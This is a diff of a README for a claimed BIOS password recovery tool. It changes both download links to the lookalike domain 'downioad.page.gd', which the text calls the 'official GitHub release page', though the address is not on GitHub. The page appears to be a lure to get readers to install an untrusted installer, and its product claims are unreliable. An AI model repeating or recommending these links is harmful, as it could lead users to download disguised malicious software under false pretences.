@@ -2,7 +2,7 @@
 
 Forgot BIOS Password Tool is a specialized software designed to help users recover or reset forgotten BIOS passwords on Windows-based computers. This tool is ideal for individuals who have lost access to their BIOS settings and need a reliable method to regain control without extensive technical knowledge. With a focus on safety and ease of use, it supports a wide range of hardware manufacturers and ensures that the process is secure and reversible.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -43,6 +43,6 @@ A: No, the Forgot BIOS Password Tool operates offline once installed. However, a
 
 To get started, download the latest version of the tool from the official GitHub release page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This tool is provided as-is for educational and recovery purposes. Last updated in 2026, it continues to receive updates for improved compatibility and features. Always use software responsibly and ensure you have the right to modify BIOS settings on your device.
